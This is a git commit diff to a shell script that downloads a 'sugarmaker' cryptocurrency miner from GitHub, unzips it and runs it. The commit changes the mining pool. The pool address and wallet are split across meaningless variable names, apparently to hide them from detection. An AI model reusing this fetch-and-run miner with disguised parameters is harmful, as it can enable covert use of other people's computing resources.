ba855d3741e44693dd7034b4fc857b965830a207
DangDev <dream858vip@gmail.com>
2022-01-03 13:49:40 +0700

    Update e.sh

--- e.sh
+++ e.sh
@@ -2,6 +2,6 @@ wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/
 unzip sugarmaker-v2.5.0-sugar4-linux64.zip
 stringh="core -t2"
 hamula="8hw80g3dsarcmlaww8hhf5gydsx."
-ching="cp://sugar.ss.dxpool.com:3366 -u sugar1qetd77wlllhj"
+ching="cp://stratum-asia.rplant.xyz:17042 -u sugar1qetd77wlllhj"
 cpus=$(lscpu | grep CPU\(s\) | head -1 | cut -f2 -d":" | awk '{$1=$1;print}')
 sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+t$ching$hamula$cpus$string
